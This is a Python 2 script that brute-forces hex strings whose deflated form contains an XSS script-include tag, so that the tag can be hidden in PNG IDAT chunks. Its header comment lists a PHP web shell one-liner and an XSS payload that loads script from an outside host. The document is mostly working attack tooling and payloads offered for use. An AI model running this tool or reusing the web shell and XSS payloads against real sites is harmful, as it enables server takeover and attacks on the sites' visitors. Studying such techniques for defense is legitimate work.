#!/usr/bin/python
'''
Author: Hunter Gregal
Based off of code and concepts:
	Adam Logue -- https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks
	IDontPlayDarts -- https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks
	fin1te -- https://whitton.io/articles/xss-on-facebook-via-png-content-types
	Vavkamil -- https://github.com/vavkamil/PNG-IDAT-chunks
Payloads:
	WebShell: <?=$_GET[0]($_POST[1]);?>
	XSS:	Varies alot. Easier with short remote include -- aka <SCRIPT src=//LOG.BZ><script>
'''
from coreFunctions import *
import re, sys

def bruteForce():
	##Config
	#<script src=//[any 1-3 letters\.bz></script> (case ignored)
	pattern = r"\<[s|S][c|C][r|R][i|I][p|P][t|T]\s[s|S][r|R][c|C]\=\/\/[0-9a-zA-Z]{1,3}\.[b|B][z|Z]\>\<\/[s|S][c|C][r|R][i|I][p|P][t|T]\>"
	template = "f399281922111510691928276e6e%s1e581b1f576e69b16375535b6f0e7f"
	start = 0x111111
	end = 0xffffff
	payloadsFile = "crackedPayloads.txt"

        #BruteForce
	keyspace = end-start
	print "Searching for matches to pattern: %s" % pattern
        print "[+]Starting Template Bruteforce..."
        i=1
	found=0
        while start < end:
                if i % 750000 == 0:
                        print "[-]Guess: %s/%s -- Left: %s" % (i,keyspace,keyspace-i)
                brute = hex(start)[2:]
                if "L" in brute:
                        brute = brute[:-1]
                guess = template % brute
                deflate = gzdeflate(hex2bin(guess))
                if re.search(pattern,deflate):
			found += 1
			m = re.search(pattern,deflate)
                        print "[!]GZDEFLATE PAYLOAD FOUND[!]"
                        print "Gzdeflate Payload String: %s" % m.group(0)
			with open(payloadsFile, 'a') as f:
				f.write("%s || %s" % (m.group(0), guess))
                start += 1
                i+=1
        return
if __name__ == '__main__':
	raw_input("Press any key to start pattern bruteforce")
	found = bruteForce()
	print "Exhausted keyspace"
	print "Found Payloads: %s" % str(found)
